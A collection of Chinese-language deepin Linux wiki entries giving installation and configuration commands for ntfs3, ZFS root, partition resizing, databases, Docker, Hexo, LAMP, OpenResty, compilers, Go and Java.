从deepin安装镜像启动，当“Install Deepin”高亮时，按e（uefi）或Tab（Legacy），删除“livecd-installer ”（包括空格，uefi需在“locales=zh_CN”后加“.UTF-8”），按F10（uefi）或回车（Legacy）进入Live模式。

标题：ntfs3内核模块安装
ntfs3内核模块可使window的ntfs磁盘分区挂载到deepin系统后实现权限的实时变更，而非固定按fstab里的权限。

下载ntfs3补丁的命令：wget https://ucare-resources.oss-cn-shenzhen.aliyuncs.com/pro/2022/05/178f047f89-f2c4-488e-8a85-d57a4db5d6c7 -O /tmp/ntfs3-5.17.patch.xz

解压ntfs3补丁需先执行cd /usr/src，再运行xzcat /tmp/ntfs3-5.17.patch.xz。

注册dkms的命令：dkms add -m ntfs3 -v 5.17。

安装ntfs3内核模块到当前系统的命令：dkms autoinstall -m ntfs3 -v 5.17。

确认ntfs3安装的命令：dkms status、modinfo ntfs。

新建/etc/udev/rules.d/99-ntfs3.rules文件，内容为'SUBSYSTEM=="block", ENV{ID_FS_TYPE}=="ntfs", ENV{ID_FS_TYPE}="ntfs3"'。

新建/etc/udisks2/mount_options.conf文件，包含'ntfs3_defaults=uid=$UID,gid=$GID,noatime,prealloc'和'ntfs3_allow=uid=$UID,gid=$GID,umask,dmask,fmask,iocharset,nohidden,sys_immutable,discard,force,sparse,showmeta,prealloc,noacsrules,acl'。

/dev/nvme0n1p1在fstab中的挂载配置：/dev/nvme0n1p1 /data ntfs3 defaults,uid=1000,gid=1000,dmask=022,fmask=022 0 0。

/dev/nvme0n1p2在fstab中的挂载配置：/dev/nvme0n1p2 /work ntfs3 defaults,uid=1000,gid=1000,dmask=022,fmask=022 0 0。

默认ntfs格式挂载后权限不可修改，ntfs3可在deepin系统挂载windows磁盘文件并修改权限，避免docker等软件因权限报错。

标题：ZFS
ZFS是一款128bit文件系统，总容量是现有64bit文件系统的1.84x10^19倍，支持单个存储卷容量达16EiB，一个zpool可拥有2^64个卷，总容量最大256ZiB，系统可拥有2^64个存储池，具有自优化、自动校验数据完整性等优点，较ext3速率提高约30%-40%。

ZFS基于存储池，与传统文件系统不同，存储池中的所有文件系统可使用存储池资源。

ZFS基于的CDDL协议与Linux内核的GPL授权不相容，故一直未在Linux推广，后因OpenZFS、ZFS on Linux等项目发展，已可在Linux上正常使用。

制作LiveCD时，需修改启动U盘根目录下boot\grub文件夹中的grub.cfg，将第十四行的livecd-installer改为livecd；再修改根目录syslinux文件夹下的live.cfg，同样将livecd-installer改为livecd。

为livecd环境配置zfs，需先通过sudo -i成为Root用户，再添加debian jessie-backports源，更新并安装zfs-dkms、gdisk，安装后运行modprobe zfs防止模块未加载。

查看硬盘id可使用ls -la /dev/disk/by-id指令，查看硬盘分区uuid可使用ls -la /dev/disk/by-partuuid指令。

若之前用mdadm创建了阵列，需用mdadm --zero-superblock --force /dev/disk/by-id/scsi-SATA_disk1清除superblock。

BIOS用户用gdisk分区的指令：sgdisk -a1 -n2:34:2047  -t2:EF02 /dev/disk/by-id/scsi-SATA_disk1；sgdisk     -n9:-8M:0    -t9:BF07 /dev/disk/by-id/scsi-SATA_disk1；sgdisk     -n1:0:0      -t1:BF01 /dev/disk/by-id/scsi-SATA_disk1。

UEFI用户用gdisk分区的指令：sgdisk     -n3:1M:+512M -t3:EF00 /dev/disk/by-id/scsi-SATA_disk1；sgdisk     -n9:-8M:0    -t9:BF07 /dev/disk/by-id/scsi-SATA_disk1；sgdisk     -n1:0:0      -t1:BF01 /dev/disk/by-id/scsi-SATA_disk1。

创建zpool的指令：zpool create -o ashift=12 -O atime=off -O canmount=off -O compression=lz4 -O normalization=formD -O mountpoint=/ -R /mnt rpool /dev/disk/by-id/scsi-SATA_disk1-part1。

需创建的dataset包括：zfs create -o mountpoint=none rpool/ROOT；zfs create -o mountpoint=/ rpool/ROOT/deepin；zfs create -o mountpoint=/home rpool/HOME；zfs create -o mountpoint=none rpool/DEEPIN；zfs create -o mountpoint=/usr/src rpool/DEEPIN/src；zfs create -o mountpoint=/srv rpool/DEEPIN/srv。

设置分区属性的指令：zpool set bootfs=rpool/ROOT/deepin rpool。

创建swap分区：zfs create -o sync=always -o primarycache=metadata -o secondarycache=none -V [VOL] rpool/swap；mkswap -f /dev/zvol/rpool/swap。

安装系统时需解压squashfs文件：unsquashfs -f -d /mnt /lib/live/mount/medium/live/filesystem.squashfs；unsquashfs -f -d /mnt /lib/live/mount/medium/overlay/overlay-language-pack-zh-hans.squashfs；unsquashfs -f -d /mnt /lib/live/mount/medium/overlay/overlay-chinese-special-framework.squashfs。

chroot进入安装目录前需执行：cd /mnt；mount --rbind /dev dev；mount --rbind /dev/pts dev/pts；mount --rbind /proc proc；mount --rbind /sys sys；cp /etc/resolv.conf /mnt/etc/；chroot /mnt /bin/bash。

在新系统中安装ZFS后，需修改/usr/share/initramfs-tools/conf.d/zfs，添加针对root=ZFS=*的判断代码。

Legacy GRUB安装：apt install --yes grub-pc；格式化引导分区为ext4，在fstab添加相关内容；mount /dev/sda2 /mnt/boot。

UEFI GRUB安装：apt install dosfstools；mkdosfs -F 32 -n EFI /dev/disk/by-id/scsi-SATA_disk1-part3；mkdir /boot/efi；修改fstab；mount /boot/efi；apt install --yes grub-efi-amd64；apt install --yes -t testing grub-efi-amd64。

swap分区信息加入fstab的内容：/dev/zvol/rpool/swap none swap sw 0 0。

添加新用户的指令：useradd -s /bin/bash -m -G users,cdrom,disk,audio,video,games,plugdev,bluetooth,netdev USERNAME。

设置root和用户密码用passwd root和passwd USERNAME指令。

将用户加入sudoer列表需通过visudo，在root ALL=(ALL:ALL) ALL下添加USERNAME ALL=(ALL:ALL) ALL。

Legacy GRUB安装到硬盘的指令：grub-install /dev/sda。

UEFI GRUB安装指令：grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=debian --recheck --no-floppy。

解除挂载并重启的步骤：mount | grep -v zfs | tac | awk '/\/mnt/ {print $3}' | xargs -i{} umount -lf {}；zpool export rpool；reboot。

标题：BleachBit
BleachBit是一款开源的系统清理工具，可释放磁盘空间，保护隐私，清除缓存、cookies等，支持清除应用残留数据，切碎文件防止恢复等。

安装BleachBit的命令是sudo apt-get install bleachbit。

卸载BleachBit的命令是sudo apt-get remove bleachbit。

BleachBit的仓库地址是http://packages.deepin.com/deepin/pool/main/b/bleachbit/。

标题：根目录扩容
deepin全盘安装时，根分区空间默认15G，可能不足，需扩容。操作前要备份数据，知晓系统损坏或数据丢失风险。

进入live系统方案一：用含deepin镜像的启动U盘，启动到安装界面，grub界面按E（非EFI启动按TAB），删除“cd-installer”，按F10进入。live系统锁屏无密码，可通过Ctrl+Alt+F2进TTY，用sudo passwd uos设密码。

进入live系统后要连接网络，以便安装工具。live系统无系统仓库，需手动添加：编辑/etc/apt/sources.list，添加deb https://community-packages.deepin.com/deepin/ apricot main contrib non-free。

安装gparted应用：先sudo apt update更新源，再sudo apt install gparted安装。

gparted扩容第一步：压缩data分区，选中后右键“更改大小/移动”，“之前的空余空间”填20480MB（20G），“之后的空余空间”为0，点击“调整大小”。

压缩data分区后，将20G空间与Rootb合并，再压缩Rootb 10G，最后将这10G与Roota合并。

应用最终数据变更前可后悔，执行后可能有意外，需确认。根据机器性能和数据量等待完成，会有成功提示。完成后应用按钮置灰，分区大小符合预期。

扩容完成后重启系统，检查系统盘容量验证成果。新版本安装器在全盘安装时可自定义根分区大小，V20.6镜像可体验。此方案适用于任何分区安装方式的后期调整。

标题：Watt Toolkit
Watt Toolkit是一个多平台适用的加速器。

Watt Toolkit的官网下载链接是https://steampp.net/。

Watt Toolkit在Gitee的下载链接为https://gitee.com/rmbgame/SteamTools。

Watt Toolkit在Github的下载链接是https://github.com/BeyondDimension/SteamTools。

标题：Firebird
Firebird RDBMS 基于 InterBase 6.0 的代码开发，是跨平台的关系数据库系统。

Firebird能运行在Windows、linux和各种Unix操作系统上，提供大部分SQL-99标准功能。

Firebird既能作为多用户环境下的数据库服务器运行，也提供嵌入式数据库实现。

Firebird脱胎于Borland公司的开源版数据库Interbase6.0，用C和C++开发。

Firebird使用Mozilla Public License v.1.1许可证发行。

一个firebird数据库服务器能管理多个独立数据库，每个数据库可支持多个客户端连结。

安装Firebird服务：sudo apt-get install firebird3.0-server。

安装Firebird组件：sudo apt-get install firebird3.0-utils。

卸载Firebird服务：sudo apt-get remove firebird3.0-server。

卸载Firebird组件：sudo apt-get remove firebird3.0-utils。

Firebird仓库地址：http://packages.deepin.com/deepin/pool/main/f/firebird3.0/

Firebird官方网站：https://firebirdsql.org/ ， https://sourceforge.net/projects/firebird/

标题：MongoDB数据库安装指南
MongoDB only provides packages for 64-bit builds of Debian 8 and 9.

mongodb-org是一个元包，会自动安装下面列出的四个组件包。

mongodb-org-server包含mongod守护进程、相关的初始化脚本和配置文件（/etc/mongod.conf）。

mongodb-org-mongos包含mongos守护进程。

mongodb-org-shell包含mongo shell。

mongodb-org-tools包含mongoimport、bsondump、mongodump、mongoexport、mongofiles、mongorestore、mongostat和mongotop等MongoDB工具。

导入MongoDB公钥的命令：sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 9DA31620334BD75D9DCB49F368818C72E52529D4

创建Debian 9 “Stretch”的MongoDB软件源的命令：echo "deb http://repo.mongodb.org/apt/debian stretch/mongodb-org/4.0 main" | sudo tee /etc/apt/sources.list.d/mongodb-org-4.0.list

安装MongoDB的命令：sudo apt-get update；sudo apt-get install -y mongodb-org

解决没有/home/mongodb目录的命令：sudo mkdir /home/mongodb；sudo chown -R mongodb:mongodb /home/mongodb

启动MongoDB服务的命令：sudo systemctl start mongod

验证MongoDB是否安装成功可查看日志文件/var/log/mongodb/mongod.log，或用命令cat /var/log/mongodb/mongod.log | grep port。

MongoDB默认端口是27017。

停止MongoDB服务的命令：sudo systemctl stop mongod

重启MongoDB服务的命令：sudo systemctl restart mongod

设置MongoDB开机启动的命令：sudo systemctl enable mongod

禁用MongoDB开机启动的命令：sudo systemctl disable mongod

进入MongoDB交互模式的命令是mongo，用Control+C退出。

删除MongoDB时，先停止服务：sudo systemctl stop mongod

删除MongoDB软件的命令：sudo apt-get purge mongodb-org*

删除MongoDB数据和日志目录的命令：sudo rm -r /var/log/mongodb；sudo rm -r /var/lib/mongodb

MongoDB实例默认数据文件存储在/var/lib/mongodb，日志文件在/var/log/mongodb。

标题：MariaDB
MariaDB 前身是MySQL，主要由开源社区在维护，目的是完全兼容MySQL，包括API和命令行，能轻松成为MySQL的代替品。

安装MariaDB的命令是sudo apt-get install mariadb-10.1。

卸载MariaDB的命令是sudo apt-get remove mariadb-10.1。

MariaDB的仓库地址是http://packages.deepin.com/deepin/pool/main/m/mariadb-10.1/。

MariaDB的官方网站是https://mariadb.org/。

标题：Mysql
Mysql可从https://dev.mysql.com/downloads/repo/apt/下载，点击Download按钮，弹出界面可点击登录或“No thanks, just start my download.”链接。

运行Mysql安装包的命令为sudo dpkg -i mysql-apt-config_0.8.15-1_all.deb，弹出界面需选择对应debian和mysql版本。

v15.11用debian 9（Stretch），v20用debian10（Buster）。

更新命令为sudo apt update。

安装Mysql的命令是sudo apt install mysql-server，安装时需输入root密码。

标题：Deepin_安装oracle12c过程
安装oracle12c需建立软链接，包括创建/usr/lib64目录，以及多个文件的链接。

调整参数需将两个文本内容追加进/etc/security/limits.conf和/etc/sysctl.conf。

安装oracle12c所需依赖可通过apt-get install libaio-dev sysstat unixodbc-dev libelf-dev unzip g++ zlib1g-dev命令安装。

建立组和用户的命令为groupadd dba；useradd -d /home/oracle -m -c "Oracle Database" -g dba -G sudo -s `which bash` oracle，之后用passwd设密码。

oracle12c安装默认目录为/home/oracle/app，无需另外建立目录。

将oracle12c软件解压到家目录，切换到oracle用户，cd到解压目录，运行xhost +，设置LANG=en_us，处理字体后运行./runInstaller。

oracle12c图形界面选择包括“install the database software only”“single instance database installation”“Enterprise Edition”，选特定选项时最大内存受dev/shm限制，按提示用root执行脚本。

安装完oracle12c后，修改家目录的.profile文件添加环境变量，包括ORACLE_BASE、ORACLE_HOME、PATH、ORACLE_SID，然后启动dbca建立同名数据库。

安装sqldeveloper需先安装alien和fakeroot，用法为fakeroot alien package.rpm，还要下载jdk并解压设置环境变量。

标题：PostgreSQL
PostgreSQL 是一个对象-关系数据库服务器(ORDBMS)。

安装PostgreSQL可使用命令：sudo apt-get install postgresql-9.6，可指定版本安装。

卸载PostgreSQL 9.6的命令是：sudo apt-get remove postgresql-9.6。

PostgreSQL 9.6的仓库地址为http://packages.deepin.com/deepin/pool/main/p/postgresql-9.6/。

PostgreSQL官方网站是https://www.postgresql.org/。

标题：SQLite
SQLite是遵守ACID的关联式数据库管理系统，包含在一个相对小的C库中。

安装SQLite版命令：sudo apt-get install sqlite；安装SQLite3版命令：sudo apt-get install sqlite3。

卸载SQLite版命令：sudo apt-get remove sqlite；卸载SQLite3版命令：sudo apt-get remove sqlite3。

SQLite仓库地址：http://packages.deepin.com/deepin/pool/main/s/sqlite/；SQLite3仓库地址：http://packages.deepin.com/deepin/pool/main/s/sqlite3/。

SQLite官方网站：https://www.sqlite.org/。

标题：SQLiteStudio
SQLiteStudio是管理sqlite数据库的工具，支持sqlite2、sqlite3，视图编码utf8，可同时打开多个数据库文件，能查看和编辑二进制字段，导出格式有csv、html、plain、sql、xml。

SQLiteStudio的安装命令是sudo apt-get install sqlitestudio。

SQLiteStudio的卸载命令是sudo apt-get remove sqlitestudio。

SQLiteStudio的仓库地址是http://packages.deepin.com/deepin/pool/main/s/sqlitestudio/。

标题：unixODBC
unixODBC是连接数据库的组件，提供标准API访问DBMS。

安装unixODBC的命令是sudo apt-get install unixodbc。

卸载unixODBC的命令是sudo apt-get remove unixodbc。

unixODBC的仓库地址是http://packages.deepin.com/deepin/pool/main/u/unixodbc/。

unixODBC的官方网站是http://www.unixodbc.org/。

标题：docker安装常见数据库
生产高并发情况下一般不建议将MySQL这样的关系型数据库运行在docker容器中。

docker pull mysql:5.7 可拉取mysql v5.7容器。

创建并运行mysql容器的命令：docker run -it --name mysql -p 3307:3306 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7，映射宿主机3307端口到容器3306端口，root密码为123456。

拉取redis v6容器的命令是docker pull redis:6。

运行redis容器的命令：docker run -p 6379:6379 --name redis -d redis:6。

拉取MongoDB容器用docker pull mongo命令。

运行MongoDB容器命令：docker run -p 27017:27017 --name mongodb -e MONGO_INITDB_ROOT_USERNAME=root -e MONGO_INITDB_ROOT_PASSWORD=123456 -d mongo:latest，设置了root用户和密码123456。

拉取PostgreSQL容器使用docker pull postgres命令。

运行PostgreSQL容器命令：docker run -p 5432:5432 --name postgresql -e POSTGRES_PASSWORD=123456 -d postgres，密码设为123456。

拉取带Web管理界面的RabbitMQ容器用docker pull rabbitmq:management命令。

RabbitMQ容器运行命令：docker run --name rabbitmq -p 5672:5672 -p 15672:15672 -e RABBITMQ_DEFAULT_USER=rbmq -e RABBITMQ_DEFAULT_PASS=rbmq --hostname=rabbitmqhosta -d rabbitmq:management，15672是web管理端端口，用户和密码为rbmq。

拉取Memcache容器的命令是docker pull memcached。

运行Memcache容器命令：docker run --name memcache -p 11211:11211 -d memcached -m 128，-m 128指定最大容量128m，默认64m。

标题：Docker
Docker是开源的应用容器引擎，可将应用及依赖包打包到可移植容器，发布到Linux机器并实现虚拟化，容器采用沙箱机制，相互无接口。

Deepin官方仓库有docker，但非docker-ce等最新版。因Deepin基于debian unstable，官方源不支持，故官方教程安装docker-ce会失败。

安装Docker最新版前，需卸载旧版本，命令为：sudo apt-get remove docker.io docker-engine。

安装Docker需先安装密钥管理与下载工具，命令：sudo apt-get install apt-transport-https ca-certificates curl python-software-properties software-properties-common。

下载安装Docker的GPG密钥，国内源（如中科大）命令：curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -；官方源命令：curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -。

查看Docker密钥是否安装成功的命令：sudo apt-key fingerprint 0EBFCD88，成功会显示含9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88的指纹。

添加docker-ce软件源需将版本名替换为Deepin基于的debian代号（通过cat /etc/debian_version查看）。如Deepin 20对应debian 10（buster），命令：sudo add-apt-repository "deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/debian buster stable"。

添加docker-ce软件源后，需更新仓库，命令：sudo apt-get update。

安装docker-ce的命令：sudo apt-get install docker-ce，网络不稳定可能导致下载失败，可重试。

启动Docker的命令：systemctl start docker。

查看Docker版本信息的命令：docker version。

验证Docker安装正常的命令：sudo docker run hello-world，能正常下载执行则安装成功。

让普通用户无需sudo运行docker，需将账号加入docker用户组：sudo usermod -aG docker $USER，然后注销重登录。

使用阿里云docker加速器：1. 申请账号获取地址；2. 执行命令：sudo mkdir -p /etc/docker；sudo tee /etc/docker/daemon.json <<-'EOF' { "registry-mirrors": ["加速器地址"] } EOF；sudo systemctl daemon-reload；sudo systemctl restart docker。

使用docker-cn镜像源：编辑/etc/docker/daemon.json输入{ "registry-mirrors": ["https://registry.docker-cn.com"] }，然后sudo service docker restart。

禁用Docker开机自启：安装chkconfig（sudo apt-get install chkconfig），然后移除自启（sudo chkconfig --del docker）。

标题：docker-ce代理
dockerd是Docker守护进程，管理和运行容器，docker pull由其执行。

为dockerd设置代理需创建/etc/systemd/system/docker.service.d文件夹，再创建proxy.conf文件并配置代理，最后重载systemd并重启Docker。

proxy.conf文件中配置代理的内容为[Service]及HTTP_PROXY、HTTPS_PROXY、NO_PROXY的环境变量。

查看dockerd环境变量配置可用sudo systemctl show --property=Environment docker命令。

容器代理可在~/.docker/config.json中添加proxies字段配置，或运行时用-e注入环境变量。

~/.docker/config.json中代理配置包含proxies.default下的httpProxy、httpsProxy、noProxy。

查看容器中代理环境变量可用sudo docker run --rm alpine sh -c 'env | grep -i _PROXY'命令。

docker build可通过--build-arg传递HTTP_PROXY、HTTPS_PROXY、NO_PROXY设置代理，仅对该次构建有效。

标题：安装 docker 社区免费版
安装docker需打开深度终端，输入命令：sudo apt install docker-ce。

标题：Docker简介与安装
Docker是基于Go语言的开源应用容器引擎，能打包应用及依赖到可移植镜像，发布到主流操作系统，实现轻量级虚拟化。

Docker的构想是实现“Build, Ship and Run Any App, Anywhere”，即管理应用的封装、分发、部署、运行生命周期，实现应用级“一次封装，到处运行”。

使用apt安装Docker可参考官方文档，第一步可选卸载旧版本：for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt remove $pkg; done。

apt安装Docker第二步是安装依赖：sudo apt update && sudo apt install ca-certificates curl gnupg。

apt安装Docker第三步是添加docker的apt仓库秘钥：curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker.gpg。

apt安装Docker第四步是添加docker的apt仓库，deepin20.9基于debian10，采用buster：sudo sh -c 'echo "deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/debian buster stable" > /etc/apt/sources.list.d/docker.list'。

apt安装Docker第五步是更新apt仓库信息并安装docker-ce：sudo apt update && sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin。

二进制安装Docker适合内网等无法访问apt源的情况，第一步是从官方下载页下载压缩包，如docker-20.10.9.tgz。

二进制安装Docker第二步是解压压缩包，将二进制文件放到/usr/local/bin目录。

二进制安装Docker第三步是新建存储docker数据的空目录，如/home/zhangsan/apps/docker（需替换用户名）。

二进制安装Docker第四步是编写服务配置文件docker.service，需注意--data-root参数为数据存储目录。

二进制安装Docker第五步是将docker.service文件放到/usr/lib/systemd/system目录。

二进制安装Docker第六步是加载服务并生效：sudo systemctl daemon-reload；sudo systemctl start docker；sudo systemctl enable docker。

二进制安装Docker第七步是使普通用户拥有使用docker的权限：sudo groupadd docker；sudo usermod zhangsan -a -G docker（替换用户名）。

二进制安装Docker第八步是注销或重启使权限生效。

二进制安装Docker第九步是验证：docker version。

标题：Deepin上搭建Hexo博客
Hexo是一个快速、简洁且高效的博客框架，使用Markdown解析文章，可生成静态网页。

GitHub Pages是GitHub官方提供的免费静态站点托管服务，可在GitHub仓库托管和发布静态网站。

Hexo基于Node.js，需安装Node.js、npm（Node.js自带）和git，以Linux为例先搭建环境。

安装Node.js：从官网下载长期维护版，解压到～/software，设置软连接，查看版本验证。

设置Node.js软连接：将解压文件重命名为nodejs，用ln命令链接npm和node到/usr/local/bin/。

验证Node.js安装：终端输入node -v和npm -v，显示版本号即成功。

Deepin V20安装Git：终端执行sudo apt-get install git，输入git --version查版本验证。

安装Hexo：用npm install -g hexo-cli，设置软连接到/usr/local/bin/，hexo -v验证。

升级Hexo：执行npm update -g hexo-cli可升级到最新版，需注意与Node.js版本兼容。

创建博客目录：在家目录用mkdir ~/blog_folder创建个人博客文件夹。

生成网页文件：cd ~，hexo init blog_folder初始化，cd进入后npm install，hexo generate生成，hexo server启动服务。

浏览本地站点：访问http://localhost:4000，端口被占用可改端口hexo server -p 6000，访问对应地址。

注册GitHub账号：官网输入邮箱注册，用户名、邮箱需真实，密码不少于8字符，选个人免费版，验证邮箱。

创建GitHub Pages仓库：登录后新建仓库，Owner为用户名，Repository name为用户名.github.io，勾选Add a README file。

配置Git用户信息：终端输入git config --global user.name "GitHub用户名"和git config --global user.email "GitHub邮箱"。

创建SSH密钥：安装ssh（sudo apt install ssh），执行ssh-keygen -t rsa -C "GitHub邮箱"，一路默认回车。

查看SSH密钥：ls ~/.ssh可看到id_rsa（私钥）和id_rsa.pub（公钥），用vim ~/.ssh/id_rsa.pub打开公钥。

添加SSH公钥到GitHub：登录后进入Settings→SSH and GPG keys→New SSH key，粘贴公钥内容。

验证GitHub连接：终端输入ssh -T git@github.com，确认后显示成功信息即连接成功。

配置个人令牌：GitHub→Settings→Developer Settings→Personal access tokens生成，选repo权限，保存令牌用于验证。

部署Hexo到GitHub：安装hexo-deployer-git，修改_config.yml的deploy部分，执行hexo clean、generate、deploy。

验证部署成功：访问https://用户名.github.io，看到Hexo网站即成功。

标题：LAMP服务
LAMP是Linux web服务器组合套装的缩写，分别是Apache+MySQL+PHP。

深度商店搜索lamp安装；命令安装，终端执行：sudo apt-get install lamp；编译安装需下载tra.gz包解压后执行./configure 、sudo make && make install，这种方法涉及许多依赖包等，费时费力，不熟悉者易失败。

手工配置安装利用apt-get，会自动检测额外库和模块，安装全过程不到10分钟。安装MySQL 5.6用sudo apt-get install mysql-server-5.6 mysql-client-5.6，安装中需设置root账户密码。

安装Apache2用sudo apt-get install apache2，在浏览器输入服务器地址如http://127.0.0.1，显示(It works!)说明工作。Apache默认文档根目录为/var/www，配置文件/etc/apache2/apache2.conf，额外配置存储在/etc/apache2子目录。

安装PHP5和Apache PHP5模块用sudo apt-get install php5 php5-mysql libapache2-mod-php5，然后重启apache：sudo /etc/init.d/apache2 restart。

安装所需PHP5模块可执行sudo apt-get install php5-curl php5-gd...等命令，然后重启Apache2，刷新http://127.0.0.1/info.php查看模块支持。

安装phpmyadmin用sudo apt-get install phpmyadmin，安装中选择Web server为apache2，输入Mysql数据库密码连接密码。将phpmyadmin与apache2建立连接，如www目录在/var/www，可用sudo ln -s /usr/share/phpmyadmin /var/www ，在浏览器打开http://127.0.0.1/phpmyadmin测试。

卸载LAMP可在深度商店搜索lamp卸载，或命令安装的用终端执行sudo apt-get remove lamp。

标题：安装openresty
OpenResty是一个基于Nginx和Lua的高性能Web平台，集成了大量Lua库、第三方模块及依赖项，用于搭建高并发、高扩展性的动态Web应用等。

安装环境为deepin v20.7 x86_64操作系统，openresty版本1.21.4.1。

下载、解压、创建目录的步骤：mkdir -p /home/admin/apps/openresty；wget https://openresty.org/download/openresty-1.21.4.1.tar.gz；tar xf openresty-1.21.4.1.tar.gz -C /home/admin/apps；cd /home/admin/apps/openresty-1.21.4.1。

安装依赖的命令：sudo apt install -y libpcre3-dev openssl libssl-dev libxml2-dev libgd-dev libxml2 libgeoip-dev libxslt-dev。

预编译时--prefix指的是实际安装目录，配置命令包含--with-threads、--with-file-aio等参数。

编译并安装命令：make；make install。多核CPU可给make加-j参数加快速度。

验证安装步骤：编辑/home/admin/apps/openresty/nginx/conf/nginx.conf，改listen 80;为listen 8000;；到/home/admin/apps/openresty/bin目录执行./openresty启动；浏览器访问http://127.0.0.1:8000，出现欢迎页则成功。

可选操作：将/home/admin/apps/openresty/bin目录添加到环境变量PATH中，方便直接使用。

标题：Clang
Clang是基于LLVM，支持C、C++、Objective C/C++等语言的编译器，用C++编写。

安装Clang可使用命令：sudo apt-get install clang，它是个空包，会自动选预设版本安装，也可指定clang-x安装对应版本。

卸载Clang的命令为：sudo apt-get remove clang。

Clang仓库地址为http://packages.deepin.com/deepin/pool/main/l/llvm-defaults/。

clang-tidy是基于Clang的代码检查工具，负责分析代码并找出编程风格不合规部分。

用clang-tidy检查代码是否符合LLVM编码规范的命令：clang-tidy -checks="llvm-*" file.cpp，其中file.cpp为需检查的代码文件。

clang-tidy的命令行格式：clang-tidy [options] <source0> [... <sourceN>] [-- <compiler command>]。

Clang的相关工具需安装Clang及其外部工具后才可使用。

Clang官方网站是https://clang.llvm.org/。

标题：GNU Compiler Collection
GNU编译器集合包括C、C++、Objective-C、Fortran、Ada、Go和D语言的前端及相关库。

Gcc 11版及之前用C语言编写，Gcc 12版及之后转换为C++编写。

安装C语言的GNU编译器用命令：sudo apt-get install gcc，gcc是空包，可指定gcc-x安装对应版本。

卸载C语言GNU编译器的命令：sudo apt-get remove gcc。

安装C++语言的GNU编译器用命令：sudo apt-get install g++，g++是空包，可指定g++-x安装对应版本。

卸载C++语言GNU编译器的命令：sudo apt-get remove g++。

安装Objective-C语言的GNU编译器用命令：sudo apt-get install gobjc，gobjc是空包，可指定gobjc-x安装对应版本。

卸载Objective-C语言GNU编译器的命令：sudo apt-get remove gobjc。

安装Objective-C++语言的GNU编译器用命令：sudo apt-get install gobjc++，可指定gobjc++-x安装对应版本。

卸载Objective-C++语言GNU编译器的命令：sudo apt-get remove gobjc++。

安装Fortran语言的GNU编译器用命令：sudo apt-get install gfortran，可指定gfortran-x安装对应版本。

卸载Fortran语言GNU编译器的命令：sudo apt-get remove gfortran。

安装Go语言的GNU编译器用命令：sudo apt-get install gccgo，可指定gccgo-x安装对应版本。

卸载Go语言GNU编译器的命令：sudo apt-get remove gccgo。

GNU编译器集合的仓库地址是http://packages.deepin.com/deepin/pool/main/g/gcc-defaults/。

GNU编译器集合的官方网站是http://gcc.gnu.org/。

标题：Intel® C++ 编译器
Intel® C++ 编译器是 Intel 公司开发的 C/C++ 编译器，在并行、矢量化支持、高性能等方面具有较好性能。

Intel® C++ Compiler 组件现在已经并入 Intel® oneAPI HPC Toolkit 工具包。

安装 Intel® C++ 编译器可使用命令：wget https://registrationcenter-download.intel.com/akdlm/irc_nas/18679/l_HPCKit_p_2022.2.0.191_offline.sh 和 sudo sh ./l_HPCKit_p_2022.2.0.191_offline.sh。

Intel® C++ 编译器的官方网站是 https://www.intel.com/content/www/us/en/developer/tools/oneapi/hpc-toolkit.html。

Intel® C++ 编译器相关的标签有 c, c++, 编译器, icc。

标题：Go
Go语言也称Golang，是编译型语言，由google出品，兼具效率、性能、安全、健壮等特性，底层对并发支持较好。

使用Go语言开发的项目有docker、kubernetes、etcd、consul、prometheus等。

Go语言官网是https://go.dev/，官方文档网址为https://go.dev/doc/。

Go语言官方安装文档为https://go.dev/doc/install，国内下载链接是https://studygolang.com/dl。

删除旧的Go语言相关文件和安装包可执行命令：rm -rf /usr/local/go && tar -C /usr/local -xzf go1.18.3.linux-amd64.tar.gz。

临时添加Go语言环境变量的命令是export PATH=$PATH:/usr/local/go/bin。

查看Go语言版本的命令是go version，成功执行则代表安装完成。

Go语言的IDE有VSCode、GoLand、Lite IDE等，推荐使用免费开源的Lite IDE。

标题：LiteIDE-2
LiteIDE是一款开源、跨平台的轻量级Go语言集成开发环境。

LiteIDE具有管理系统环境、集成调试系统、代码自动完成、支持插件扩展等功能。

安装LiteIDE可使用命令：sudo apt-get install liteide。

卸载LiteIDE的命令是：sudo apt-get remove liteide。

LiteIDE的仓库地址为http://packages.deepin.com/deepin/pool/non-free/l/liteide/。

标题：Java开发环境部署
安装SUN JDK（现Oracle JDK）需下载.tar.gz压缩包，解压缩到/usr/lib，再用update-alternatives命令配置java和javac。

tomcat安装需下载解压缩，启动用sudo ./bin/startup.sh，关闭用sudo ./bin/shutdown.sh，验证关闭可访问http://localhost:8080/。

MYSQL安装先解压缩，新增mysql用户和组，创建链接，改文件夹权限，执行初始化脚本，配置环境，启动服务并设密码，还可设置开机自启动。

Eclipse安装需先装JDK8，下载最新版解压，创建快捷方式需编辑eclipse.desktop文件并写入指定内容。

MAVEN安装需下载加压到指定位置，用update-alternatives配置命令连接符，在conf/setting.xml中配置默认jdk版本和编译级别。

标题：Linux系统安装配置JDK环境教程
openjdk 18下载地址为https://jdk.java.net/18/

可通过wget https://download.java.net/java/GA/jdk18.0.1.1/65ae32619e2f40f3a9af3af1851d6e19/2/GPL/openjdk-18.0.1.1_linux-x64_bin.tar.gz命令下载jdk

jdk可解压到指定位置，如/home/$USER/jdk-18/

配置系统全局环境变量可使用sudo vim /etc/profile命令

bash用户配置个人环境变量可编辑.bashrc文件

zsh用户配置个人环境变量可编辑.zshrc文件

环境变量配置需添加export JAVA_HOME=$(PATH_TO_JAVA_INSTALL_DIR)和export PATH=$PATH:$JAVA_HOME/bin，JAVA_HOME为实际解压路径

jdk8以上版本无需设置CLASSPATH

系统级环境变量生效需执行source /etc/profile命令

bash用户个人环境变量生效需执行source .bashrc命令

zsh用户个人环境变量生效需执行source .zshrc命令

标题：MonoDevelop
MonoDevelop是个跨平台的集成开发环境，主要用来开发Mono与.NETFramework软件。

